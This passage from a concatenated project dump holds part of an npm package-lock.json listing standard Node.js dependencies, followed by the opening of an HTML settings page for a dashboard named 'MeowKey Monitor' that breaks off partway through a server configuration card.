      "license": "ISC",
      "dependencies": {
        "is-glob": "^4.0.1"
      },
      "engines": {
        "node": ">= 6"
      }
    },
    "node_modules/gopd": {
      "version": "1.2.0",
      "resolved": "https://registry.npmjs.org/gopd/-/gopd-1.2.0.tgz",
      "integrity": "sha512-ZUKRh6/kUFoAiTAtTYPZJ3hw9wNxx+BIBOijnlG9PnrJsCcSjs1wyyD6vJpaYtgnzDrKYRSqf3OO6Rfa93xsRg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/has-flag": {
      "version": "3.0.0",
      "resolved": "https://registry.npmjs.org/has-flag/-/has-flag-3.0.0.tgz",
      "integrity": "sha512-sKJf1+ceQBr4SMkvQnBDNDtf4TXpVhVGateu0t918bl30FnbE2m4vNLX+VWe/dpjlb+HugGYzW7uQXH98HPEYw==",
      "dev": true,
      "license": "MIT",
      "engines": {
        "node": ">=4"
      }
    },
    "node_modules/has-symbols": {
      "version": "1.1.0",
      "resolved": "https://registry.npmjs.org/has-symbols/-/has-symbols-1.1.0.tgz",
      "integrity": "sha512-1cDNdwJ2Jaohmb3sg4OmKaMBwuC48sYni5HUw2DvsC8LjGTLK9h+eb1X6RyuOHe4hT0ULCW68iomhjUoKUqlPQ==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/hasown": {
      "version": "2.0.2",
      "resolved": "https://registry.npmjs.org/hasown/-/hasown-2.0.2.tgz",
      "integrity": "sha512-0hJU9SCPvmMzIBdZFqNPXWa6dqh7WdH0cII9y+CyS8rG3nL48Bclra9HmKhVVUHyPWNH5Y7xDwAB7bfgSjkUMQ==",
      "license": "MIT",
      "dependencies": {
        "function-bind": "^1.1.2"
      },
      "engines": {
        "node": ">= 0.4"
      }
    },
    "node_modules/http-errors": {
      "version": "2.0.1",
      "resolved": "https://registry.npmjs.org/http-errors/-/http-errors-2.0.1.tgz",
      "integrity": "sha512-4FbRdAX+bSdmo4AUFuS0WNiPz8NgFt+r8ThgNWmlrjQjt1Q7ZR9+zTlce2859x4KSXrwIsaeTqDoKQmtP8pLmQ==",
      "license": "MIT",
      "dependencies": {
        "depd": "~2.0.0",
        "inherits": "~2.0.4",
        "setprototypeof": "~1.2.0",
        "statuses": "~2.0.2",
        "toidentifier": "~1.0.1"
      },
      "engines": {
        "node": ">= 0.8"
      },
      "funding": {
        "type": "opencollective",
        "url": "https://opencollective.com/express"
      }
    },
    "node_modules/iconv-lite": {
      "version": "0.4.24",
      "resolved": "https://registry.npmjs.org/iconv-lite/-/iconv-lite-0.4.24.tgz",
      "integrity": "sha512-v3MXnZAcvnywkTUEZomIActle7RXXeedOR31wwl7VlyoXO4Qi9arvSenNQWne1TcRwhCL1HwLI21bEqdpj8/rA==",
      "license": "MIT",
      "dependencies": {
        "safer-buffer": ">= 2.1.2 < 3"
      },
      "engines": {
        "node": ">=0.10.0"
      }
    },
    "node_modules/ignore-by-default": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/ignore-by-default/-/ignore-by-default-1.0.1.tgz",
      "integrity": "sha512-Ius2VYcGNk7T90CppJqcIkS5ooHUZyIQK+ClZfMfMNFEF9VSE73Fq+906u/CWu92x4gzZMWOwfFYckPObzdEbA==",
      "dev": true,
      "license": "ISC"
    },
    "node_modules/inherits": {
      "version": "2.0.4",
      "resolved": "https://registry.npmjs.org/inherits/-/inherits-2.0.4.tgz",
      "integrity": "sha512-k/vGaX4/Yla3WzyMCvTQOXYeIHvqOKtnqBduzTHpzpQZzAskKMhZ2K+EnBiSM9zGSoIFeMpXKxa4dYeZIQqewQ==",
      "license": "ISC"
    },
    "node_modules/ipaddr.js": {
      "version": "1.9.1",
      "resolved": "https://registry.npmjs.org/ipaddr.js/-/ipaddr.js-1.9.1.tgz",
      "integrity": "sha512-0KI/607xoxSToH7GjN1FfSbLoU0+btTicjsQSWQlh/hZykN8KpmMf7uYwPW3R+akZ6R/w18ZlXSHBYXiYUPO3g==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.10"
      }
    },
    "node_modules/is-binary-path": {
      "version": "2.1.0",
      "resolved": "https://registry.npmjs.org/is-binary-path/-/is-binary-path-2.1.0.tgz",
      "integrity": "sha512-ZMERYes6pDydyuGidse7OsHxtbI7WVeUEozgR/g7rd0xUimYNlvZRE/K2MgZTjWy725IfelLeVcEM97mmtRGXw==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "binary-extensions": "^2.0.0"
      },
      "engines": {
        "node": ">=8"
      }
    },
    "node_modules/is-extglob": {
      "version": "2.1.1",
      "resolved": "https://registry.npmjs.org/is-extglob/-/is-extglob-2.1.1.tgz",
      "integrity": "sha512-SbKbANkN603Vi4jEZv49LeVJMn4yGwsbzZworEoyEiutsN3nJYdbO36zfhGJ6QEDpOZIFkDtnq5JRxmvl3jsoQ==",
      "dev": true,
      "license": "MIT",
      "engines": {
        "node": ">=0.10.0"
      }
    },
    "node_modules/is-glob": {
      "version": "4.0.3",
      "resolved": "https://registry.npmjs.org/is-glob/-/is-glob-4.0.3.tgz",
      "integrity": "sha512-xelSayHH36ZgE7ZWhli7pW34hNbNl8Ojv5KVmkJD4hBdD3th8Tfk9vYasLM+mXWOZhFkgZfxhLSnrwRr4elSSg==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "is-extglob": "^2.1.1"
      },
      "engines": {
        "node": ">=0.10.0"
      }
    },
    "node_modules/is-number": {
      "version": "7.0.0",
      "resolved": "https://registry.npmjs.org/is-number/-/is-number-7.0.0.tgz",
      "integrity": "sha512-41Cifkg6e8TylSpdtTpeLVMqvSBEVzTttHvERD741+pnZ8ANv0004MRL43QKPDlK9cGvNp6NZWZUBlbGXYxxng==",
      "dev": true,
      "license": "MIT",
      "engines": {
        "node": ">=0.12.0"
      }
    },
    "node_modules/math-intrinsics": {
      "version": "1.1.0",
      "resolved": "https://registry.npmjs.org/math-intrinsics/-/math-intrinsics-1.1.0.tgz",
      "integrity": "sha512-/IXtbwEk5HTPyEwyKX6hGkYXxM9nbj64B+ilVJnC/R6B0pH5G4V3b0pVbL7DBj4tkhBAppbQUlf6F6Xl9LHu1g==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.4"
      }
    },
    "node_modules/media-typer": {
      "version": "0.3.0",
      "resolved": "https://registry.npmjs.org/media-typer/-/media-typer-0.3.0.tgz",
      "integrity": "sha512-dq+qelQ9akHpcOl/gUVRTxVIOkAJ1wR3QAvb4RsVjS8oVoFjDGTc679wJYmUmknUF5HwMLOgb5O+a3KxfWapPQ==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/merge-descriptors": {
      "version": "1.0.3",
      "resolved": "https://registry.npmjs.org/merge-descriptors/-/merge-descriptors-1.0.3.tgz",
      "integrity": "sha512-gaNvAS7TZ897/rVaZ0nMtAyxNyi/pdbjbAwUpFQpN70GqnVfOiXpeUUMKRBmzXaSQ8DdTX4/0ms62r2K+hE6mQ==",
      "license": "MIT",
      "funding": {
        "url": "https://github.com/sponsors/sindresorhus"
      }
    },
    "node_modules/methods": {
      "version": "1.1.2",
      "resolved": "https://registry.npmjs.org/methods/-/methods-1.1.2.tgz",
      "integrity": "sha512-iclAHeNqNm68zFtnZ0e+1L2yUIdvzNoauKU4WBA3VvH/vPFieF7qfRlwUZU+DA9P9bPXIS90ulxoUoCH23sV2w==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/mime": {
      "version": "1.6.0",
      "resolved": "https://registry.npmjs.org/mime/-/mime-1.6.0.tgz",
      "integrity": "sha512-x0Vn8spI+wuJ1O6S7gnbaQg8Pxh4NNHb7KSINmEWKiPE4RKOplvijn+NkmYmmRgP68mc70j2EbeTFRsrswaQeg==",
      "license": "MIT",
      "bin": {
        "mime": "cli.js"
      },
      "engines": {
        "node": ">=4"
      }
    },
    "node_modules/mime-db": {
      "version": "1.52.0",
      "resolved": "https://registry.npmjs.org/mime-db/-/mime-db-1.52.0.tgz",
      "integrity": "sha512-sPU4uV7dYlvtWJxwwxHD0PuihVNiE7TyAbQ5SWxDCB9mUYvOgroQOwYQQOKPJ8CIbE+1ETVlOoK1UC2nU3gYvg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/mime-types": {
      "version": "2.1.35",
      "resolved": "https://registry.npmjs.org/mime-types/-/mime-types-2.1.35.tgz",
      "integrity": "sha512-ZDY+bPm5zTTF+YpCrAU9nK0UgICYPT0QtT1NZWFv4s++TNkcgVaT0g6+4R2uI4MjQjzysHB1zxuWL50hzaeXiw==",
      "license": "MIT",
      "dependencies": {
        "mime-db": "1.52.0"
      },
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/minimatch": {
      "version": "3.1.2",
      "resolved": "https://registry.npmjs.org/minimatch/-/minimatch-3.1.2.tgz",
      "integrity": "sha512-J7p63hRiAjw1NDEww1W7i37+ByIrOWO5XQQAzZ3VOcL0PNybwpfmV/N05zFAzwQ9USyEcX6t3UO+K5aqBQOIHw==",
      "dev": true,
      "license": "ISC",
      "dependencies": {
        "brace-expansion": "^1.1.7"
      },
      "engines": {
        "node": "*"
      }
    },
    "node_modules/ms": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/ms/-/ms-2.0.0.tgz",
      "integrity": "sha512-Tpp60P6IUJDTuOq/5Z8cdskzJujfwqfOTkrwIwj7IRISpnkJnT6SyJ4PCPnGMoFjC9ddhal5KVIYtAt97ix05A==",
      "license": "MIT"
    },
    "node_modules/negotiator": {
      "version": "0.6.3",
      "resolved": "https://registry.npmjs.org/negotiator/-/negotiator-0.6.3.tgz",
      "integrity": "sha512-+EUsqGPLsM+j/zdChZjsnX51g4XrHFOIXwfnCVPGlQk/k5giakcKsuxCObBRu6DSm9opw/O6slWbJdghQM4bBg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/nodemon": {
      "version": "3.1.11",
      "resolved": "https://registry.npmjs.org/nodemon/-/nodemon-3.1.11.tgz",
      "integrity": "sha512-is96t8F/1//UHAjNPHpbsNY46ELPpftGUoSVNXwUfMk/qdjSylYrWSu1XavVTBOn526kFiOR733ATgNBCQyH0g==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "chokidar": "^3.5.2",
        "debug": "^4",
        "ignore-by-default": "^1.0.1",
        "minimatch": "^3.1.2",
        "pstree.remy": "^1.1.8",
        "semver": "^7.5.3",
        "simple-update-notifier": "^2.0.0",
        "supports-color": "^5.5.0",
        "touch": "^3.1.0",
        "undefsafe": "^2.0.5"
      },
      "bin": {
        "nodemon": "bin/nodemon.js"
      },
      "engines": {
        "node": ">=10"
      },
      "funding": {
        "type": "opencollective",
        "url": "https://opencollective.com/nodemon"
      }
    },
    "node_modules/nodemon/node_modules/debug": {
      "version": "4.4.3",
      "resolved": "https://registry.npmjs.org/debug/-/debug-4.4.3.tgz",
      "integrity": "sha512-RGwwWnwQvkVfavKVt22FGLw+xYSdzARwm0ru6DhTVA3umU5hZc28V3kO4stgYryrTlLpuvgI9GiijltAjNbcqA==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "ms": "^2.1.3"
      },
      "engines": {
        "node": ">=6.0"
      },
      "peerDependenciesMeta": {
        "supports-color": {
          "optional": true
        }
      }
    },
    "node_modules/nodemon/node_modules/ms": {
      "version": "2.1.3",
      "resolved": "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz",
      "integrity": "sha512-6FlzubTLZG3J2a/NVCAleEhjzq5oxgHyaCU9yYXvcLsvoVaHJq/s5xXI6/XXP6tz7R9xAOtHnSO/tXtF3WRTlA==",
      "dev": true,
      "license": "MIT"
    },
    "node_modules/normalize-path": {
      "version": "3.0.0",
      "resolved": "https://registry.npmjs.org/normalize-path/-/normalize-path-3.0.0.tgz",
      "integrity": "sha512-6eZs5Ls3WtCisHWp9S2GUy8dqkpGi4BVSz3GaqiE6ezub0512ESztXUwUB6C6IKbQkY2Pnb/mD4WYojCRwcwLA==",
      "dev": true,
      "license": "MIT",
      "engines": {
        "node": ">=0.10.0"
      }
    },
    "node_modules/object-inspect": {
      "version": "1.13.4",
      "resolved": "https://registry.npmjs.org/object-inspect/-/object-inspect-1.13.4.tgz",
      "integrity": "sha512-W67iLl4J2EXEGTbfeHCffrjDfitvLANg0UlX3wFUUSTx92KXRFegMHUVgSqE+wvhAbi4WqjGg9czysTV2Epbew==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/on-finished": {
      "version": "2.4.1",
      "resolved": "https://registry.npmjs.org/on-finished/-/on-finished-2.4.1.tgz",
      "integrity": "sha512-oVlzkg3ENAhCk2zdv7IJwd/QUD4z2RxRwpkcGY8psCVcCYZNq4wYnVWALHM+brtuJjePWiYF/ClmuDr8Ch5+kg==",
      "license": "MIT",
      "dependencies": {
        "ee-first": "1.1.1"
      },
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/parseurl": {
      "version": "1.3.3",
      "resolved": "https://registry.npmjs.org/parseurl/-/parseurl-1.3.3.tgz",
      "integrity": "sha512-CiyeOxFT/JZyN5m0z9PfXw4SCBJ6Sygz1Dpl0wqjlhDEGGBP1GnsUVEL0p63hoG1fcj3fHynXi9NYO4nWOL+qQ==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/path-to-regexp": {
      "version": "0.1.12",
      "resolved": "https://registry.npmjs.org/path-to-regexp/-/path-to-regexp-0.1.12.tgz",
      "integrity": "sha512-RA1GjUVMnvYFxuqovrEqZoxxW5NUZqbwKtYz/Tt7nXerk0LbLblQmrsgdeOxV5SFHf0UDggjS/bSeOZwt1pmEQ==",
      "license": "MIT"
    },
    "node_modules/picomatch": {
      "version": "2.3.1",
      "resolved": "https://registry.npmjs.org/picomatch/-/picomatch-2.3.1.tgz",
      "integrity": "sha512-JU3teHTNjmE2VCGFzuY8EXzCDVwEqB2a8fsIvwaStHhAWJEeVd1o1QD80CU6+ZdEXXSLbSsuLwJjkCBWqRQUVA==",
      "dev": true,
      "license": "MIT",
      "engines": {
        "node": ">=8.6"
      },
      "funding": {
        "url": "https://github.com/sponsors/jonschlinkert"
      }
    },
    "node_modules/proxy-addr": {
      "version": "2.0.7",
      "resolved": "https://registry.npmjs.org/proxy-addr/-/proxy-addr-2.0.7.tgz",
      "integrity": "sha512-llQsMLSUDUPT44jdrU/O37qlnifitDP+ZwrmmZcoSKyLKvtZxpyV0n2/bD/N4tBAAZ/gJEdZU7KMraoK1+XYAg==",
      "license": "MIT",
      "dependencies": {
        "forwarded": "0.2.0",
        "ipaddr.js": "1.9.1"
      },
      "engines": {
        "node": ">= 0.10"
      }
    },
    "node_modules/pstree.remy": {
      "version": "1.1.8",
      "resolved": "https://registry.npmjs.org/pstree.remy/-/pstree.remy-1.1.8.tgz",
      "integrity": "sha512-77DZwxQmxKnu3aR542U+X8FypNzbfJ+C5XQDk3uWjWxn6151aIMGthWYRXTqT1E5oJvg+ljaa2OJi+VfvCOQ8w==",
      "dev": true,
      "license": "MIT"
    },
    "node_modules/qs": {
      "version": "6.14.0",
      "resolved": "https://registry.npmjs.org/qs/-/qs-6.14.0.tgz",
      "integrity": "sha512-YWWTjgABSKcvs/nWBi9PycY/JiPJqOD4JA6o9Sej2AtvSGarXxKC3OQSk4pAarbdQlKAh5D4FCQkJNkW+GAn3w==",
      "license": "BSD-3-Clause",
      "dependencies": {
        "side-channel": "^1.1.0"
      },
      "engines": {
        "node": ">=0.6"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/range-parser": {
      "version": "1.2.1",
      "resolved": "https://registry.npmjs.org/range-parser/-/range-parser-1.2.1.tgz",
      "integrity": "sha512-Hrgsx+orqoygnmhFbKaHE6c296J+HTAQXoxEF6gNupROmmGJRoyzfG3ccAveqCBrwr/2yxQ5BVd/GTl5agOwSg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/raw-body": {
      "version": "2.5.3",
      "resolved": "https://registry.npmjs.org/raw-body/-/raw-body-2.5.3.tgz",
      "integrity": "sha512-s4VSOf6yN0rvbRZGxs8Om5CWj6seneMwK3oDb4lWDH0UPhWcxwOWw5+qk24bxq87szX1ydrwylIOp2uG1ojUpA==",
      "license": "MIT",
      "dependencies": {
        "bytes": "~3.1.2",
        "http-errors": "~2.0.1",
        "iconv-lite": "~0.4.24",
        "unpipe": "~1.0.0"
      },
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/readdirp": {
      "version": "3.6.0",
      "resolved": "https://registry.npmjs.org/readdirp/-/readdirp-3.6.0.tgz",
      "integrity": "sha512-hOS089on8RduqdbhvQ5Z37A0ESjsqz6qnRcffsMU3495FuTdqSm+7bhJ29JvIOsBDEEnan5DPu9t3To9VRlMzA==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "picomatch": "^2.2.1"
      },
      "engines": {
        "node": ">=8.10.0"
      }
    },
    "node_modules/safe-buffer": {
      "version": "5.2.1",
      "resolved": "https://registry.npmjs.org/safe-buffer/-/safe-buffer-5.2.1.tgz",
      "integrity": "sha512-rp3So07KcdmmKbGvgaNxQSJr7bGVSVk5S9Eq1F+ppbRo70+YeaDxkw5Dd8NPN+GD6bjnYm2VuPuCXmpuYvmCXQ==",
      "funding": [
        {
          "type": "github",
          "url": "https://github.com/sponsors/feross"
        },
        {
          "type": "patreon",
          "url": "https://www.patreon.com/feross"
        },
        {
          "type": "consulting",
          "url": "https://feross.org/support"
        }
      ],
      "license": "MIT"
    },
    "node_modules/safer-buffer": {
      "version": "2.1.2",
      "resolved": "https://registry.npmjs.org/safer-buffer/-/safer-buffer-2.1.2.tgz",
      "integrity": "sha512-YZo3K82SD7Riyi0E1EQPojLz7kpepnSQI9IyPbHHg1XXXevb5dJI7tpyN2ADxGcQbHG7vcyRHk0cbwqcQriUtg==",
      "license": "MIT"
    },
    "node_modules/semver": {
      "version": "7.7.3",
      "resolved": "https://registry.npmjs.org/semver/-/semver-7.7.3.tgz",
      "integrity": "sha512-SdsKMrI9TdgjdweUSR9MweHA4EJ8YxHn8DFaDisvhVlUOe4BF1tLD7GAj0lIqWVl+dPb/rExr0Btby5loQm20Q==",
      "dev": true,
      "license": "ISC",
      "bin": {
        "semver": "bin/semver.js"
      },
      "engines": {
        "node": ">=10"
      }
    },
    "node_modules/send": {
      "version": "0.19.2",
      "resolved": "https://registry.npmjs.org/send/-/send-0.19.2.tgz",
      "integrity": "sha512-VMbMxbDeehAxpOtWJXlcUS5E8iXh6QmN+BkRX1GARS3wRaXEEgzCcB10gTQazO42tpNIya8xIyNx8fll1OFPrg==",
      "license": "MIT",
      "dependencies": {
        "debug": "2.6.9",
        "depd": "2.0.0",
        "destroy": "1.2.0",
        "encodeurl": "~2.0.0",
        "escape-html": "~1.0.3",
        "etag": "~1.8.1",
        "fresh": "~0.5.2",
        "http-errors": "~2.0.1",
        "mime": "1.6.0",
        "ms": "2.1.3",
        "on-finished": "~2.4.1",
        "range-parser": "~1.2.1",
        "statuses": "~2.0.2"
      },
      "engines": {
        "node": ">= 0.8.0"
      }
    },
    "node_modules/send/node_modules/ms": {
      "version": "2.1.3",
      "resolved": "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz",
      "integrity": "sha512-6FlzubTLZG3J2a/NVCAleEhjzq5oxgHyaCU9yYXvcLsvoVaHJq/s5xXI6/XXP6tz7R9xAOtHnSO/tXtF3WRTlA==",
      "license": "MIT"
    },
    "node_modules/serve-static": {
      "version": "1.16.3",
      "resolved": "https://registry.npmjs.org/serve-static/-/serve-static-1.16.3.tgz",
      "integrity": "sha512-x0RTqQel6g5SY7Lg6ZreMmsOzncHFU7nhnRWkKgWuMTu5NN0DR5oruckMqRvacAN9d5w6ARnRBXl9xhDCgfMeA==",
      "license": "MIT",
      "dependencies": {
        "encodeurl": "~2.0.0",
        "escape-html": "~1.0.3",
        "parseurl": "~1.3.3",
        "send": "~0.19.1"
      },
      "engines": {
        "node": ">= 0.8.0"
      }
    },
    "node_modules/setprototypeof": {
      "version": "1.2.0",
      "resolved": "https://registry.npmjs.org/setprototypeof/-/setprototypeof-1.2.0.tgz",
      "integrity": "sha512-E5LDX7Wrp85Kil5bhZv46j8jOeboKq5JMmYM3gVGdGH8xFpPWXUMsNrlODCrkoxMEeNi/XZIwuRvY4XNwYMJpw==",
      "license": "ISC"
    },
    "node_modules/side-channel": {
      "version": "1.1.0",
      "resolved": "https://registry.npmjs.org/side-channel/-/side-channel-1.1.0.tgz",
      "integrity": "sha512-ZX99e6tRweoUXqR+VBrslhda51Nh5MTQwou5tnUDgbtyM0dBgmhEDtWGP/xbKn6hqfPRHujUNwz5fy/wbbhnpw==",
      "license": "MIT",
      "dependencies": {
        "es-errors": "^1.3.0",
        "object-inspect": "^1.13.3",
        "side-channel-list": "^1.0.0",
        "side-channel-map": "^1.0.1",
        "side-channel-weakmap": "^1.0.2"
      },
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/side-channel-list": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/side-channel-list/-/side-channel-list-1.0.0.tgz",
      "integrity": "sha512-FCLHtRD/gnpCiCHEiJLOwdmFP+wzCmDEkc9y7NsYxeF4u7Btsn1ZuwgwJGxImImHicJArLP4R0yX4c2KCrMrTA==",
      "license": "MIT",
      "dependencies": {
        "es-errors": "^1.3.0",
        "object-inspect": "^1.13.3"
      },
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/side-channel-map": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/side-channel-map/-/side-channel-map-1.0.1.tgz",
      "integrity": "sha512-VCjCNfgMsby3tTdo02nbjtM/ewra6jPHmpThenkTYh8pG9ucZ/1P8So4u4FGBek/BjpOVsDCMoLA/iuBKIFXRA==",
      "license": "MIT",
      "dependencies": {
        "call-bound": "^1.0.2",
        "es-errors": "^1.3.0",
        "get-intrinsic": "^1.2.5",
        "object-inspect": "^1.13.3"
      },
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/side-channel-weakmap": {
      "version": "1.0.2",
      "resolved": "https://registry.npmjs.org/side-channel-weakmap/-/side-channel-weakmap-1.0.2.tgz",
      "integrity": "sha512-WPS/HvHQTYnHisLo9McqBHOJk2FkHO/tlpvldyrnem4aeQp4hai3gythswg6p01oSoTl58rcpiFAjF2br2Ak2A==",
      "license": "MIT",
      "dependencies": {
        "call-bound": "^1.0.2",
        "es-errors": "^1.3.0",
        "get-intrinsic": "^1.2.5",
        "object-inspect": "^1.13.3",
        "side-channel-map": "^1.0.1"
      },
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/simple-update-notifier": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/simple-update-notifier/-/simple-update-notifier-2.0.0.tgz",
      "integrity": "sha512-a2B9Y0KlNXl9u/vsW6sTIu9vGEpfKu2wRV6l1H3XEas/0gUIzGzBoP/IouTcUQbm9JWZLH3COxyn03TYlFax6w==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "semver": "^7.5.3"
      },
      "engines": {
        "node": ">=10"
      }
    },
    "node_modules/statuses": {
      "version": "2.0.2",
      "resolved": "https://registry.npmjs.org/statuses/-/statuses-2.0.2.tgz",
      "integrity": "sha512-DvEy55V3DB7uknRo+4iOGT5fP1slR8wQohVdknigZPMpMstaKJQWhwiYBACJE3Ul2pTnATihhBYnRhZQHGBiRw==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/supports-color": {
      "version": "5.5.0",
      "resolved": "https://registry.npmjs.org/supports-color/-/supports-color-5.5.0.tgz",
      "integrity": "sha512-QjVjwdXIt408MIiAqCX4oUKsgU2EqAGzs2Ppkm4aQYbjm+ZEWEcW4SfFNTr4uMNZma0ey4f5lgLrkB0aX0QMow==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "has-flag": "^3.0.0"
      },
      "engines": {
        "node": ">=4"
      }
    },
    "node_modules/to-regex-range": {
      "version": "5.0.1",
      "resolved": "https://registry.npmjs.org/to-regex-range/-/to-regex-range-5.0.1.tgz",
      "integrity": "sha512-65P7iz6X5yEr1cwcgvQxbbIw7Uk3gOy5dIdtZ4rDveLqhrdJP+Li/Hx6tyK0NEb+2GCyneCMJiGqrADCSNk8sQ==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "is-number": "^7.0.0"
      },
      "engines": {
        "node": ">=8.0"
      }
    },
    "node_modules/toidentifier": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/toidentifier/-/toidentifier-1.0.1.tgz",
      "integrity": "sha512-o5sSPKEkg/DIQNmH43V0/uerLrpzVedkUh8tGNvaeXpfpuwjKenlSox/2O/BTlZUtEe+JG7s5YhEz608PlAHRA==",
      "license": "MIT",
      "engines": {
        "node": ">=0.6"
      }
    },
    "node_modules/touch": {
      "version": "3.1.1",
      "resolved": "https://registry.npmjs.org/touch/-/touch-3.1.1.tgz",
      "integrity": "sha512-r0eojU4bI8MnHr8c5bNo7lJDdI2qXlWWJk6a9EAFG7vbhTjElYhBVS3/miuE0uOuoLdb8Mc/rVfsmm6eo5o9GA==",
      "dev": true,
      "license": "ISC",
      "bin": {
        "nodetouch": "bin/nodetouch.js"
      }
    },
    "node_modules/type-is": {
      "version": "1.6.18",
      "resolved": "https://registry.npmjs.org/type-is/-/type-is-1.6.18.tgz",
      "integrity": "sha512-TkRKr9sUTxEH8MdfuCSP7VizJyzRNMjj2J2do2Jr3Kym598JVdEksuzPQCnlFPW4ky9Q+iA+ma9BGm06XQBy8g==",
      "license": "MIT",
      "dependencies": {
        "media-typer": "0.3.0",
        "mime-types": "~2.1.24"
      },
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/undefsafe": {
      "version": "2.0.5",
      "resolved": "https://registry.npmjs.org/undefsafe/-/undefsafe-2.0.5.tgz",
      "integrity": "sha512-WxONCrssBM8TSPRqN5EmsjVrsv4A8X12J4ArBiiayv3DyyG3ZlIg6yysuuSYdZsVz3TKcTg2fd//Ujd4CHV1iA==",
      "dev": true,
      "license": "MIT"
    },
    "node_modules/unpipe": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/unpipe/-/unpipe-1.0.0.tgz",
      "integrity": "sha512-pjy2bYhSsufwWlKwPc+l3cN7+wuJlK6uz0YdJEOlQDbl6jo/YlPi4mb8agUkVC8BF7V8NuzeyPNqRksA3hztKQ==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/utils-merge": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/utils-merge/-/utils-merge-1.0.1.tgz",
      "integrity": "sha512-pMZTvIkT1d+TFGvDOqodOclx0QWkkgi6Tdoa8gC8ffGAAqz9pzPTZWAybbsHHoED/ztMtkv/VoYTYyShUn81hA==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.4.0"
      }
    },
    "node_modules/vary": {
      "version": "1.1.2",
      "resolved": "https://registry.npmjs.org/vary/-/vary-1.1.2.tgz",
      "integrity": "sha512-BNGbWLfd0eUPabhkXUVm0j8uuvREyTh5ovRa/dyow/BqAbZJyC+5fU+IzQOzmAKzYqYRAISoRhdQr3eIZ/PXqg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.8"
      }
    }
  }
}


===== FILE: ./UI/settings.html =====

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings - MeowKey Monitor</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="logo">
                <h1>MeowKey Monitor</h1>
                <p class="subtitle">System Settings & Statistics</p>
            </div>
            <nav class="nav">
                <a href="index.html" class="nav-link"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
                <a href="waiting_room.html" class="nav-link"><i class="fas fa-user-clock"></i> Waiting Room</a>
                <a href="clients.html" class="nav-link"><i class="fas fa-users"></i> Clients</a>
                <a href="settings.html" class="nav-link active"><i class="fas fa-cog"></i> Settings</a>
                <div class="status-indicator">
                    <span class="status-dot active"></span>
                    <span class="status-text">Server: Online</span>
                </div>
            </nav>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <div class="dashboard-header">
                <h2>System Settings</h2>
                <div class="stats-summary">
                    <div class="stat-card">
                        <span class="stat-value" id="uptime">0d 0h</span>
                        <span class="stat-label">Server Uptime</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" id="database-size">0 MB</span>
                        <span class="stat-label">Database Size</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" id="total-events">0</span>
                        <span class="stat-label">Total Events</span>
                    </div>
                </div>
            </div>

            <!-- Settings Grid -->
            <div class="settings-grid">
                <!-- Server Configuration -->
                <div class="settings-card">
                    <h3>Server Configuration</h3>
                    <div class="setting-item">
                        <span class="setting-label">Server Port</span>
                        <span class="setting-value" id="server-port">8080</span>
                    </div>
                    <div class="setting-item">
                        <span class="setting-label">Database File</span>
